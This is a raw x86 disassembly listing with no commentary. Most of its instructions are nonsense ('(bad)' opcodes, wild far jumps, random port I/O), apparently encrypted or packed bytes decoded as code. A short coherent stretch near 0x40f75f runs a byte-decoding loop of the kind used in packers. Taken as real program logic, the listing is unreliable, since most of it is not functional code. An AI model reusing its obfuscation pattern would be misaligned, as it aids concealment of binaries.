  40f717:	xchg   DWORD PTR [edx+0x2c8ab17b],eax
  40f71d:	xor    eax,0x36533903
  40f722:	inc    ecx
  40f723:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f724:	inc    ebx
  40f725:	loopne 0x40f717
  40f727:	push   0x778f4020
  40f72c:	bound  esp,QWORD PTR [ebp+0x6d]
  40f72f:	or     DWORD PTR [esi+0x5],esi
  40f732:	stos   BYTE PTR es:[edi],al
  40f733:	mov    ebp,0xc9e4a793
  40f738:	push   ebp
  40f739:	add    al,0xb2
  40f73b:	push   eax
  40f73c:	adc    al,BYTE PTR [edi+0x222c8f2e]
  40f742:	call   0x70093975
  40f747:	gs cs (bad) 
  40f74a:	mov    dl,0x50
  40f74c:	mov    dl,0x27
  40f74e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f74f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f750:	push   ss
  40f751:	outs   dx,DWORD PTR ds:[esi]
  40f752:	shr    al,1
  40f754:	cmp    ah,BYTE PTR [esi-0xc66dcf9]
  40f75a:	xor    dl,BYTE PTR [ecx-0x75]
  40f75d:	inc    ebp
  40f75e:	clc    
  40f75f:	mov    ecx,DWORD PTR [ebp-0x20]
  40f762:	add    ecx,DWORD PTR [eax]
  40f764:	mov    DWORD PTR [ebp-0x24],ecx
  40f767:	mov    eax,DWORD PTR [ebp-0x24]
  40f76a:	mov    ecx,DWORD PTR [ebp-0x8]
  40f76d:	mov    eax,DWORD PTR [eax+0xc]
  40f770:	mov    ecx,DWORD PTR [ecx]
  40f772:	mov    al,BYTE PTR [eax+ecx*1]
  40f775:	add    al,0x37
  40f777:	xor    al,0x47
  40f779:	cmp    al,0xc5
  40f77b:	je     0x40f792
  40f781:	mov    eax,DWORD PTR [ebp+0x8]
  40f784:	mov    ecx,DWORD PTR [ebp-0x8]
  40f787:	xor    eax,esi
  40f789:	add    eax,edi
  40f78b:	mov    DWORD PTR [ecx],eax
  40f78d:	jmp    0x40f7b6
  40f792:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40f799:	jmp    0x40f7b6
  40f79e:	mov    eax,DWORD PTR [ebp-0x8]
  40f7a1:	mov    ecx,DWORD PTR [ebp-0x1c]
  40f7a4:	mov    ecx,DWORD PTR [ecx]
  40f7a6:	mov    DWORD PTR [eax],ecx
  40f7a8:	mov    eax,DWORD PTR [ebp+0xc]
  40f7ab:	mov    eax,DWORD PTR [ebp+0x8]
  40f7ae:	push   DWORD PTR [ebp-0x8]
  40f7b1:	call   0x401000
  40f7b6:	mov    eax,DWORD PTR [ebp-0xc]
  40f7b9:	cmp    eax,ebx
  40f7bb:	je     0x40e863
  40f7c1:	mov    eax,DWORD PTR [ebp-0x8]
  40f7c4:	mov    eax,DWORD PTR [eax]
  40f7c6:	pop    edi
  40f7c7:	pop    esi
  40f7c8:	pop    ebx
  40f7c9:	leave  
  40f7ca:	ret    0x8
  40f7cd:	push   ebp
  40f7ce:	mov    ebp,esp
  40f7d0:	jmp    0x40fb9a
  40f7d5:	ds cmp al,0x79
  40f7d8:	adc    BYTE PTR [ecx-0x23],bh
  40f7db:	(bad)  
  40f7dd:	dec    ebp
  40f7de:	xor    eax,0x7f3346f3
  40f7e3:	dec    eax
  40f7e4:	popa   
  40f7e5:	pop    edi
  40f7e6:	mov    ch,0x70
  40f7e8:	jo     0x40f78d
  40f7ea:	jge    0x40f85c
  40f7ec:	jo     0x40f83b
  40f7ee:	cld    
  40f7ef:	cmp    dl,BYTE PTR ds:0xea051116
  40f7f5:	or     eax,0x63c7e078
  40f7fa:	jmp    0xb3a7:0x91e5a9aa
  40f801:	push   edx
  40f802:	imul   edx,ebp,0x795ad3e9
  40f808:	add    eax,DWORD PTR [edx]
  40f80a:	push   edi
  40f80b:	or     BYTE PTR [esi-0x2099e227],bl
  40f811:	inc    ecx
  40f812:	(bad)  
  40f813:	gs pop es
  40f815:	inc    eax
  40f816:	popf   
  40f817:	jb     0x40f804
  40f819:	sbb    al,0x8e
  40f81b:	ins    BYTE PTR es:[edi],dx
  40f81c:	test   DWORD PTR [edx+ebp*1-0x546e49c],eax
  40f823:	js     0x40f7f8
  40f825:	loop   0x40f82b
  40f827:	sti    
  40f828:	gs stos BYTE PTR es:[edi],al
  40f82a:	mov    eax,0x91a397e7
  40f82f:	sub    cl,BYTE PTR [ebp-0x5b]
  40f832:	or     al,0xd4
  40f834:	jne    0x40f856
  40f836:	std    
  40f837:	popa   
  40f838:	xchg   esp,eax
  40f839:	xchg   ecx,eax
  40f83a:	pop    esp
  40f83b:	mov    BYTE PTR [ebp+0x6],ch
  40f83e:	imul   BYTE PTR [edi]
  40f840:	mov    ds:0xde41ae91,eax
  40f845:	jnp    0x40f87a
  40f847:	bound  ecx,QWORD PTR [ecx-0x4ed9df1]
  40f84d:	pop    edx
  40f84e:	in     eax,dx
  40f84f:	xor    DWORD PTR [ebx-0x54],edx
  40f852:	(bad)  
  40f853:	loopne 0x40f899
  40f855:	xor    DWORD PTR [esi],0xf75af4e4
  40f85b:	(bad)  
  40f85c:	jge    0x40f7fc
  40f85e:	pminsw mm3,QWORD PTR [edi+ecx*8]
  40f862:	lods   eax,DWORD PTR ds:[esi]
  40f863:	and    ch,BYTE PTR [ebx+0x4b25ba50]
  40f869:	add    ch,BYTE PTR [eax-0x2a2286e]
  40f86f:	add    al,0xa1
  40f871:	std    
  40f872:	inc    edx
  40f873:	stos   DWORD PTR es:[edi],eax
  40f874:	jno    0x40f8ba
  40f876:	xchg   ecx,eax
  40f877:	jnp    0x40f89c
  40f879:	aaa    
  40f87a:	mov    edi,0x4f563016
  40f87f:	inc    ecx
  40f880:	ss cmp al,0x9c
  40f883:	mov    bl,0x1
  40f885:	sub    bh,ch
  40f887:	pop    ecx
  40f888:	nop
  40f889:	and    DWORD PTR [ecx+0x67],edi
  40f88c:	scas   al,BYTE PTR es:[edi]
  40f88d:	xlat   BYTE PTR ds:[ebx]
  40f88e:	push   es
  40f88f:	and    al,0xf0
  40f891:	inc    edx
  40f892:	mov    DWORD PTR [ebx],esi
  40f894:	int    0xcc
  40f896:	fdiv   st(4),st
  40f898:	add    al,BYTE PTR ds:0x632d72d8
  40f89e:	repnz adc al,0x12
  40f8a1:	jno    0x40f8cd
  40f8a3:	int    0xd4
  40f8a5:	jl     0x40f8f9
  40f8a7:	aam    0xde
  40f8a9:	add    dh,BYTE PTR [ebx-0x499a4df8]
  40f8af:	mov    ecx,0x221d9bff
  40f8b4:	mov    al,0xbb
  40f8b6:	add    ebx,DWORD PTR [ecx]
  40f8b8:	mov    ebx,0xb47772b5
  40f8be:	jnp    0x40f93f
  40f8c0:	int    0xb0
  40f8c2:	or     eax,0x245453
  40f8c7:	aaa    
  40f8c8:	push   0x9745ae59
  40f8cd:	xchg   ecx,eax
  40f8ce:	or     bh,BYTE PTR [ebx+0x66]
  40f8d1:	mov    dh,0x3b
  40f8d3:	aam    0xc4
  40f8d5:	loop   0x40f896
  40f8d7:	in     al,dx
  40f8d8:	(bad)  
  40f8d9:	sub    dh,ch
  40f8db:	and    al,BYTE PTR [esi-0x32]
  40f8de:	rcl    BYTE PTR [ebp+0x55],1
  40f8e1:	out    dx,eax
  40f8e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8e3:	xchg   BYTE PTR [edi],ch
  40f8e5:	jmp    0x1f51:0x41d34049
  40f8ec:	ret    
  40f8ed:	test   BYTE PTR es:[edx-0x1aaef470],al
  40f8f4:	imul   ebx,esp,0x26
  40f8f7:	add    al,0x78
  40f8f9:	adc    al,0x80
  40f8fb:	test   BYTE PTR [edi],bl
  40f8fd:	mov    ds,WORD PTR [ecx+ebx*8]
  40f900:	jecxz  0x40f8c3
  40f902:	dec    esp
  40f903:	les    edx,FWORD PTR [ecx+0x277f0c86]
  40f909:	cmp    ebp,edx
  40f90b:	mov    esp,0xf5e90115
  40f910:	out    0x71,al
  40f912:	pop    edx
  40f913:	mov    bl,0x89
  40f915:	es out dx,al
  40f917:	mov    edx,0x35bc26af
  40f91c:	or     al,0x6c
  40f91e:	pusha  
  40f91f:	popa   
  40f920:	gs enter 0xbac2,0xba
  40f925:	inc    edi
  40f926:	mov    esp,0x86c64153
  40f92b:	and    ebx,ebx
  40f92d:	add    BYTE PTR [eax+0x1f10d6e5],bh
  40f933:	retf   0xff35
  40f936:	rcl    BYTE PTR [edi-0x78],0xfd
  40f93a:	loope  0x40f8fe
  40f93c:	cdq    
  40f93d:	popf   
  40f93e:	loopne 0x40f933
  40f940:	mov    ah,0x39
  40f942:	mov    dl,0xc8
  40f944:	adc    ch,BYTE PTR [eax+0x30333462]
  40f94a:	ret    
  40f94b:	fldcw  WORD PTR [ebp-0x1]
  40f94e:	scas   al,BYTE PTR es:[edi]
  40f94f:	pop    esi
  40f950:	inc    ebp
  40f951:	mov    edx,DWORD PTR [esp+ebx*4-0x46]
  40f955:	inc    esp
  40f956:	inc    ebx
  40f957:	retf   0xb77d
  40f95a:	push   es
  40f95b:	sub    al,0xbb
  40f95d:	iret   
  40f95e:	bound  ecx,QWORD PTR gs:[edi]
  40f961:	test   DWORD PTR [edi-0x55],0xd600ddca
  40f968:	pop    ebp
  40f969:	jno    0x40f93f
  40f96b:	add    eax,0xb72cb2e8
  40f970:	xor    al,0xc7
  40f972:	and    al,0xc8
  40f974:	les    ecx,FWORD PTR [esi+0x45]
  40f977:	aad    0x7f
  40f979:	cmp    al,0x66
  40f97b:	shl    BYTE PTR [ebx-0x74bdd43e],cl
  40f981:	xor    BYTE PTR [eax-0x58],bh
  40f984:	and    BYTE PTR [ebp+esi*4+0x2c],al
  40f988:	jmp    0x5d2a95d0
  40f98d:	jmp    0x15e2:0x889ee3b1
  40f994:	int3   
  40f995:	mov    ss,ebp
  40f997:	js     0x40f9a6
  40f999:	aad    0x59
  40f99b:	add    DWORD PTR [ebx-0x681e84ea],0x0
  40f9a2:	cmp    ebx,DWORD PTR ds:0xa1eae2ae
  40f9a8:	ja     0x40fa0b
  40f9aa:	retf   0x606e
  40f9ad:	add    esi,edx
  40f9af:	outs   dx,DWORD PTR ds:[esi]
  40f9b0:	mov    ebx,DWORD PTR [ebx]
  40f9b2:	arpl   WORD PTR [esi],bp
  40f9b4:	adc    al,0x77
  40f9b6:	cmp    ebp,ebp
  40f9b8:	sub    BYTE PTR [ebx-0x2c0b2d35],ch
  40f9be:	div    bl
  40f9c0:	push   ds
  40f9c1:	adc    DWORD PTR [eax+0x6d825258],esi
  40f9c7:	jb     0x40fa04
  40f9c9:	and    dh,0xb3
  40f9cc:	stos   BYTE PTR es:[edi],al
  40f9cd:	int    0x44
  40f9cf:	into   
  40f9d0:	test   BYTE PTR [eax-0x2f538d46],cl
  40f9d6:	push   ds
  40f9d7:	add    al,0x3c
  40f9d9:	fild   DWORD PTR [ebx]
  40f9db:	mov    cl,0x12
  40f9dd:	ret    
  40f9de:	mov    al,ds:0xd11fd37d
  40f9e3:	outs   dx,BYTE PTR ds:[esi]
  40f9e4:	stos   DWORD PTR es:[edi],eax
  40f9e5:	add    BYTE PTR [ecx+0x1ad4d384],0x94
  40f9ec:	mov    ebx,0x1f7292de
  40f9f1:	jp     0x40f97f
  40f9f3:	cli    
  40f9f4:	scas   al,BYTE PTR es:[edi]
  40f9f5:	sub    DWORD PTR [ebp+0x1933aece],eax
  40f9fb:	arpl   si,cx
  40f9fd:	sbb    DWORD PTR [eax-0x4f36efc1],ebx
  40fa03:	fstp   DWORD PTR [edx]
  40fa05:	ins    BYTE PTR es:[edi],dx
  40fa06:	jp     0x40f9d0
  40fa08:	ror    bh,cl
  40fa0a:	adc    eax,0x4c968275
  40fa0f:	sub    DWORD PTR [edx+0x1],eax
  40fa12:	retf   
  40fa13:	loopne 0x40f9c2
  40fa15:	idiv   BYTE PTR [esi]
  40fa17:	popf   
  40fa18:	xchg   BYTE PTR [ebx],dh
  40fa1a:	jo     0x40fa67
  40fa1c:	fild   WORD PTR [ebp+0x8]
  40fa1f:	rcl    BYTE PTR [edi+0x4b],1
  40fa22:	fdiv   DWORD PTR [esi+0x6860ecf1]
  40fa28:	jmp    0x1f0c368d
  40fa2d:	xchg   edx,eax
  40fa2e:	jno    0x40f9d9
  40fa30:	sub    al,BYTE PTR [ecx+0x4080cf42]
  40fa36:	(bad)  
  40fa37:	out    dx,al
  40fa38:	jecxz  0x40fa98
  40fa3a:	in     eax,0x28
  40fa3c:	out    0x1c,eax
  40fa3e:	and    eax,0x328c8d6e
  40fa43:	jg     0x40fa94
  40fa45:	shr    eax,0x8f
  40fa48:	in     al,0x95
  40fa4a:	jmp    0x233f:0x16089f7c
  40fa51:	(bad)  
  40fa52:	(bad)  [ecx+ecx*2+0x4cc252c6]
  40fa59:	inc    edi
  40fa5a:	retf   0xe7f
  40fa5d:	retf   0xfa5f
  40fa60:	lods   eax,DWORD PTR ds:[esi]
  40fa61:	fist   WORD PTR [edx-0x5336fa2e]
  40fa67:	pop    esi
  40fa68:	jle    0x40f9f0
  40fa6a:	icebp  
  40fa6b:	push   es
  40fa6c:	mov    al,0x1
  40fa6e:	repz jbe 0x40fa1e
  40fa71:	mov    ebp,0xb1d8eac0
  40fa76:	and    al,0xb0
  40fa78:	fisub  DWORD PTR [edx+0x68aa9bcd]
  40fa7e:	adc    ecx,edx
  40fa80:	mov    ch,0xae
  40fa82:	jmp    0xc6c5:0x45ec2816
  40fa89:	push   ss
  40fa8a:	or     edx,esp
  40fa8c:	mov    ds:0x75037ba3,eax
  40fa91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa92:	stc    
  40fa93:	cmp    bl,BYTE PTR [esi]
  40fa95:	arpl   WORD PTR [esi+0x6c2bf6e4],di
  40fa9b:	fmul   st(1),st
  40fa9d:	(bad)  
  40fa9f:	dec    esp
  40faa0:	xor    cl,al
  40faa2:	sub    bl,dl
  40faa4:	jnp    0x40faec
  40faa6:	xchg   esi,eax
  40faa7:	cld    
  40faa8:	xchg   edi,eax
  40faa9:	sub    edx,DWORD PTR [ecx+0x3b79b0b6]
  40faaf:	jg     0x40fb12
  40fab1:	sub    BYTE PTR [ecx+0x33],al
  40fab4:	cli    
  40fab5:	add    al,0x12
  40fab7:	mov    ebx,0x59b97daa
  40fabc:	ror    DWORD PTR [esi],0xdf
  40fabf:	(bad)  
  40fac0:	or     BYTE PTR [ebp-0x6c],dl
  40fac3:	xor    BYTE PTR [esi-0xb62b0d9],ah
  40fac9:	outs   dx,DWORD PTR ds:[esi]
  40faca:	cwde   
  40facb:	dec    esi
  40facc:	jnp    0x40faad
  40face:	xchg   ecx,eax
  40facf:	sbb    DWORD PTR [edi],esi
  40fad1:	outs   dx,BYTE PTR ds:[esi]
  40fad2:	pop    ds
  40fad3:	mov    edi,0xec742e50
  40fad8:	mov    ah,0xcb
  40fada:	sub    eax,0xe99b917
  40fadf:	push   ecx
  40fae0:	mov    edi,esi
  40fae2:	or     eax,DWORD PTR [ebx+0x7]
  40fae5:	xchg   ebp,eax
  40fae6:	outs   dx,DWORD PTR ds:[esi]
  40fae7:	dec    esi
  40fae8:	xchg   DWORD PTR [esi+0x130eeb6],eax
  40faee:	jmp    0x717a:0xaffdbc8b
  40faf5:	xchg   esp,eax
  40faf6:	push   0xc0a46783
  40fafb:	nop
  40fafc:	inc    eax
  40fafd:	xlat   BYTE PTR ds:[ebx]
  40fafe:	inc    ebx
  40faff:	cdq    
  40fb00:	push   ecx
  40fb01:	dec    ecx
  40fb02:	(bad)  
  40fb03:	imul   eax,DWORD PTR [ebp+0x52],0x8bb71a51
  40fb0a:	icebp  
  40fb0b:	fistp  QWORD PTR [esi-0x1f1b38e0]
  40fb11:	stc    
  40fb12:	and    DWORD PTR [ecx+ecx*2],ebx
  40fb15:	xlat   BYTE PTR ds:[ebx]
  40fb16:	pop    esi
  40fb17:	xchg   edi,eax
  40fb18:	jecxz  0x40fb4c
  40fb1a:	(bad)  
  40fb1b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb1c:	mov    al,ds:0x1cd0e931
  40fb21:	xchg   ecx,eax
  40fb22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb23:	add    esi,edx
  40fb25:	or     DWORD PTR [esi+0x48238d1f],ebx
  40fb2b:	dec    ebp
  40fb2c:	sbb    ebx,DWORD PTR [edx-0x7]
  40fb2f:	lea    edx,[esi]
  40fb31:	in     eax,dx
  40fb32:	dec    ebx
  40fb33:	call   0x2b1e:0xfbde899c
  40fb3a:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb3c:	rol    esp,cl
  40fb3e:	shl    DWORD PTR [esi],0xd
  40fb41:	or     edi,DWORD PTR [ebp+0x2b303ea2]
  40fb47:	sub    eax,ebx
  40fb49:	jge    0x40facc
  40fb4b:	stos   DWORD PTR es:[edi],eax
  40fb4c:	and    DWORD PTR [eax+0x30],ecx
  40fb4f:	pop    esp
  40fb50:	fist   DWORD PTR [edx]
  40fb52:	jo     0x40fb4f
  40fb54:	cli    
  40fb55:	jmp    0x8332323d
  40fb5a:	pop    esp
  40fb5b:	out    0xcc,eax
  40fb5d:	cld    
  40fb5e:	mov    edx,0x3331bcdd
  40fb63:	adc    al,0x18
  40fb65:	xchg   edi,eax
  40fb66:	ja     0x40fbac
  40fb68:	mov    bl,0xd8
  40fb6a:	stc    
  40fb6b:	lods   eax,DWORD PTR ds:[esi]
  40fb6c:	sbb    edi,DWORD PTR [edi+0x3d]
  40fb6f:	fcomi  st,st(3)
  40fb71:	dec    ebp
  40fb72:	sub    ecx,DWORD PTR [esi-0xe11502a]
  40fb78:	mov    eax,0xe460358a
  40fb7d:	in     eax,dx
  40fb7e:	push   ebx
  40fb7f:	iret   
  40fb80:	mul    BYTE PTR [ecx+0x7e]
  40fb83:	sti    
  40fb84:	or     al,0x7
  40fb86:	(bad)  
  40fb87:	(bad)
  40fb8b:	dec    esi
  40fb8c:	outs   dx,DWORD PTR ds:[esi]
  40fb8d:	push   ebx
  40fb8e:	sub    bl,BYTE PTR [esi+eax*1+0x34]
  40fb92:	mov    bh,0xea
  40fb94:	fmul   QWORD PTR [ebx-0x6fd5a70e]
  40fb9a:	push   ecx
  40fb9b:	neg    DWORD PTR ds:0x42e1a4
  40fba1:	jmp    0x40ff6b
  40fba6:	mov    ebp,ecx
  40fba8:	cli    
  40fba9:	xor    DWORD PTR [edx-0x648a4e8f],edi
  40fbaf:	test   BYTE PTR [ebp-0x51],0x89
  40fbb3:	imul   edi,DWORD PTR [ebx],0x70b1823a
  40fbb9:	jo     0x40fb5e
  40fbbb:	jge    0x40fc2d
  40fbbd:	jo     0x40fc0f
  40fbbf:	daa    
  40fbc0:	jnp    0x40fbc3
  40fbc2:	jne    0x40fbf0
  40fbc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fbc5:	push   esp
  40fbc6:	rcl    BYTE PTR [ebx],1
  40fbc8:	cmp    al,0xab
  40fbca:	jmp    0x96782c4e
  40fbcf:	ss mov esp,0xd374bf4c
  40fbd5:	jne    0x40fbe9
  40fbd7:	sub    esp,ebp
  40fbd9:	call   0xae58:0xc632ef95
  40fbe0:	jl     0x40fbc0
  40fbe2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fbe3:	nop
  40fbe4:	pusha  
  40fbe5:	cmc    
  40fbe6:	adc    eax,0x5afdfb2c
  40fbeb:	stc    
  40fbec:	fcmovnb st,st(1)
  40fbee:	push   ecx
  40fbef:	popa   
  40fbf0:	push   0xffffff9d
  40fbf2:	dec    esp
  40fbf3:	cmp    edx,esp
  40fbf5:	neg    DWORD PTR [esi+0x3b]
  40fbf8:	lods   eax,DWORD PTR cs:[esi]
  40fbfa:	adc    eax,0x45b46d39
  40fbff:	fmul   DWORD PTR [edi-0x2]
  40fc02:	push   cs
  40fc03:	xor    eax,0x40b0cc75
  40fc08:	pop    eax
  40fc09:	push   ss
  40fc0a:	add    BYTE PTR fs:[ecx-0x5e],dl
  40fc0e:	cwde   
  40fc0f:	push   ebp
  40fc10:	retf   0xc75c
  40fc13:	retf   0x618e
  40fc16:	push   ebp
  40fc17:	mov    eax,0x464626e8
  40fc1c:	add    BYTE PTR [ebp-0x640c27a8],0x12
  40fc23:	adc    dh,bl
  40fc25:	or     al,0x38
  40fc27:	inc    esp
  40fc28:	nop
  40fc29:	sbb    eax,0x18af967e
  40fc2e:	mov    al,0xa9
  40fc30:	in     eax,dx
  40fc31:	fsub   QWORD PTR [ebx+0x57]
  40fc34:	xlat   BYTE PTR ds:[ebx]
  40fc35:	imul   esi,DWORD PTR [ecx],0x76
  40fc38:	dec    esp
  40fc39:	test   DWORD PTR [ecx+0x2f],edi
  40fc3c:	inc    ebp
  40fc3d:	std    
  40fc3e:	adc    al,BYTE PTR [esi-0x5e1adec8]
  40fc44:	pop    edx
  40fc45:	es dec ecx
  40fc47:	cmp    DWORD PTR [esi+0x16],0xb4989b78
  40fc4e:	ret    0x7f13
  40fc51:	push   0x94c7525e
  40fc56:	fdivr  QWORD PTR [esi-0x4f55d018]
  40fc5c:	push   eax
  40fc5d:	sbb    ah,bh
  40fc5f:	lahf   
  40fc60:	xchg   edi,eax
  40fc61:	and    ecx,DWORD PTR [edx]
  40fc63:	xlat   BYTE PTR ds:[ebx]
  40fc64:	xlat   BYTE PTR ds:[ebx]
  40fc65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc66:	int    0xd6
  40fc68:	mov    edi,0xd68ae7bf
  40fc6d:	pop    ecx
  40fc6e:	ins    DWORD PTR es:[edi],dx
  40fc6f:	fimul  WORD PTR [ecx-0x431c871d]
  40fc75:	imul   esp,DWORD PTR [eax+0x437ec02e],0xffffff97
  40fc7c:	scas   eax,DWORD PTR es:[edi]
  40fc7d:	cvtps2pd xmm5,QWORD PTR [ecx+eax*8+0x6d]
  40fc82:	aad    0x64
  40fc84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc85:	cmp    ebp,ebp
  40fc87:	dec    eax
  40fc88:	adc    BYTE PTR [ebx+0xe3c7a77],ch
  40fc8e:	std    
  40fc8f:	mov    dh,0x30
  40fc91:	jge    0x40fc45
  40fc93:	in     al,dx
  40fc94:	sar    BYTE PTR [eax-0x30],1
  40fc97:	mov    edx,0xcd37e4d2
  40fc9c:	mov    dh,0x5a
  40fc9e:	dec    ebx
  40fc9f:	fisub  WORD PTR [eax]
  40fca1:	stos   BYTE PTR es:[edi],al
  40fca2:	and    cl,BYTE PTR [edi]
  40fca4:	lea    esi,[edx]
  40fca6:	or     edi,DWORD PTR [eax-0x5dadbffc]
  40fcac:	sub    esp,ebx
  40fcae:	sub    edi,DWORD PTR [edi-0x3a]
  40fcb1:	xchg   BYTE PTR [ebp+0x675a7ee1],ah
  40fcb7:	adc    DWORD PTR [ebx],ebx
  40fcb9:	mul    BYTE PTR [edi-0x37]
  40fcbc:	imul   ecx,esi,0x2fbafacc
  40fcc2:	pop    ecx
  40fcc3:	dec    ecx
  40fcc4:	repz int3 
  40fcc6:	xchg   esi,eax
  40fcc7:	icebp  
  40fcc8:	cmp    DWORD PTR [edx-0x24c46d69],ebx
  40fcce:	icebp  
  40fccf:	inc    ebp
  40fcd0:	inc    ebp
  40fcd1:	jg     0x40fcef
  40fcd3:	pop    eax
  40fcd4:	jl     0x40fca6
  40fcd6:	fwait
  40fcd7:	mov    esi,0x79e55454
  40fcdc:	ficom  WORD PTR [ecx-0x6]
  40fcdf:	fmul   st(0),st
  40fce1:	ins    DWORD PTR es:[edi],dx
  40fce2:	retf   0xb884
  40fce5:	aas    
  40fce6:	(bad)  
  40fce7:	loopne 0x40fd33
  40fce9:	sub    esp,DWORD PTR [bp-0x22]
  40fced:	xor    BYTE PTR [edx],cl
  40fcef:	xchg   edx,eax
  40fcf0:	je     0x40fd5d
  40fcf2:	bswap  eax
  40fcf4:	xchg   ebp,eax
  40fcf5:	test   BYTE PTR [esi+0x6e],0xff
  40fcf9:	fistp  QWORD PTR [esi]
  40fcfb:	sbb    edx,DWORD PTR [edx-0x7c]
  40fcfe:	push   0x1d
  40fd00:	div    BYTE PTR [eax+ebx*2]
  40fd03:	mov    ah,0xeb
  40fd05:	lds    ebx,FWORD PTR [ebx+0xa9bfbbe]
  40fd0b:	cmc    
  40fd0c:	adc    al,0x25
  40fd0e:	(bad)
  40fd11:	ins    DWORD PTR es:[edi],dx
  40fd12:	shl    BYTE PTR [ecx-0x66],cl
  40fd15:	xchg   BYTE PTR [eax],ah
  40fd17:	pop    es
  40fd18:	hlt    
  40fd19:	or     ebx,DWORD PTR [esi-0x25c61554]
  40fd1f:	dec    edi
  40fd20:	ja     0x40fd33
  40fd22:	lahf   
  40fd23:	(bad)
  40fd26:	cmp    al,0x6
  40fd28:	jg     0x40fd36
  40fd2a:	aaa    
  40fd2b:	adc    bl,dh
  40fd2d:	and    cl,ah
  40fd2f:	xor    DWORD PTR [ebx],ebx
  40fd31:	aas    
  40fd32:	dec    ecx
  40fd33:	sub    esp,DWORD PTR [ebx]
  40fd35:	mov    bp,0xc692
  40fd39:	das    
  40fd3a:	mov    bl,0x9d
  40fd3c:	pop    ds
  40fd3d:	jns    0x40fd88
  40fd3f:	pop    ecx
  40fd40:	sbb    ebp,edi
  40fd42:	pop    es
  40fd43:	xlat   BYTE PTR ds:[ebx]
  40fd44:	add    BYTE PTR [esp+ebp*1],cl
  40fd47:	daa    
  40fd48:	jne    0x40fd4d
  40fd4a:	leave  
  40fd4b:	or     BYTE PTR [ecx],ch
  40fd4d:	jmp    0x1984:0x628af71e
  40fd54:	and    BYTE PTR [edi+0xb],al
  40fd57:	sub    eax,0x2f6e0e74
  40fd5c:	or     BYTE PTR [ecx-0x197a257c],ah
  40fd62:	mov    edx,0x4c40f585
  40fd67:	fisttp DWORD PTR [ebp-0x1ee63601]
  40fd6d:	in     al,0x2c
  40fd6f:	add    BYTE PTR [esi-0x22283658],dl
  40fd75:	leave  
  40fd76:	xchg   DWORD PTR [edi+0x6a],esi
  40fd79:	in     al,0xc3
  40fd7b:	cli    
  40fd7c:	inc    ebx
  40fd7d:	das    
  40fd7e:	xchg   esp,eax
  40fd7f:	stos   BYTE PTR es:[edi],al
  40fd80:	hlt    
  40fd81:	aam    0x4a
  40fd83:	jmp    0xc9bf:0xb2a94604
  40fd8a:	push   esp
  40fd8b:	cli    
  40fd8c:	push   esi
  40fd8e:	add    eax,0xa1abf2b4
  40fd93:	cld    
  40fd94:	pop    es
  40fd95:	mov    bl,0xcd
  40fd97:	shl    al,0xab
  40fd9a:	test   eax,0xa099badc
  40fd9f:	add    BYTE PTR [edx-0x12],al
  40fda2:	xor    BYTE PTR [ecx],dl
  40fda4:	mov    esi,esi
  40fda6:	add    edx,ebx
  40fda8:	xchg   edi,eax
  40fda9:	push   ss
  40fdaa:	stos   BYTE PTR es:[edi],al
  40fdab:	push   esp
  40fdac:	push   esp
  40fdad:	xor    eax,0xda398777
  40fdb2:	jo     0x40fd73
  40fdb4:	(bad)  
  40fdb5:	int3   
  40fdb6:	repz inc esi
  40fdb8:	dec    esi
  40fdb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fdba:	mov    BYTE PTR [ecx],ch
  40fdbc:	je     0x40fd76
  40fdbe:	repnz and ecx,ebx
  40fdc1:	adc    al,0x45
  40fdc3:	shl    ch,0x69
  40fdc6:	pop    eax
  40fdc7:	retf   
  40fdc8:	push   0xffffffbb
  40fdca:	pop    edx
  40fdcb:	retf   0x947e
  40fdce:	in     al,0xee
  40fdd0:	outs   dx,DWORD PTR ds:[esi]
  40fdd1:	inc    edx
  40fdd2:	jp     0x40fe13
  40fdd4:	xor    DWORD PTR [edx+edx*8],edi
  40fdd7:	push   esp
  40fdd8:	jne    0x40fd9e
  40fdda:	adc    al,0x9d
  40fddc:	add    bl,dh
  40fdde:	mov    ds:0x3eb4d9e0,al
  40fde3:	sahf   
  40fde4:	mov    WORD PTR [edi+0x5dbf6153],ds
  40fdea:	hlt    
  40fdeb:	mov    ah,0x48
  40fded:	out    dx,al
  40fdee:	dec    edi
  40fdef:	jno    0x40fe6d
  40fdf1:	pushf  
  40fdf2:	ins    DWORD PTR es:[edi],dx
  40fdf3:	mov    dh,0xc3
  40fdf5:	icebp  
  40fdf6:	test   BYTE PTR [edx+0x43abbeff],dh
  40fdfc:	ins    DWORD PTR es:[edi],dx
  40fdfd:	xchg   DWORD PTR [ebp+0x64],ebx
  40fe00:	ret    
  40fe01:	icebp  
  40fe02:	ins    BYTE PTR es:[edi],dx
  40fe03:	xor    cl,BYTE PTR [ebp+0x71]
  40fe06:	enter  0x67e1,0xce
  40fe0a:	add    BYTE PTR [esi],0x40
  40fe0d:	adc    BYTE PTR [ebx+0x6b],ch
  40fe10:	test   eax,0x32f97c16
  40fe15:	rcr    BYTE PTR [edx+ecx*2-0x7fddd8],0x1c
  40fe1d:	aam    0xc3
  40fe1f:	in     eax,0x57
  40fe21:	or     BYTE PTR ds:0x68c4ce2,cl
  40fe27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fe28:	les    esp,FWORD PTR [edx-0x66255028]
  40fe2e:	jl     0x40fdc5
  40fe30:	inc    ebp
  40fe31:	pop    ss
  40fe32:	pop    edi
  40fe33:	das    
  40fe34:	stos   BYTE PTR es:[edi],al
  40fe35:	xor    al,0xc9
  40fe37:	mov    ebx,0x9d24920
  40fe3c:	and    dl,dl
  40fe3e:	add    BYTE PTR [ebx],ch
  40fe40:	sbb    DWORD PTR [ecx+eax*1-0x64],edx
  40fe44:	lea    esi,[ebx-0x1]
  40fe47:	mov    ebp,0xbe0296e5
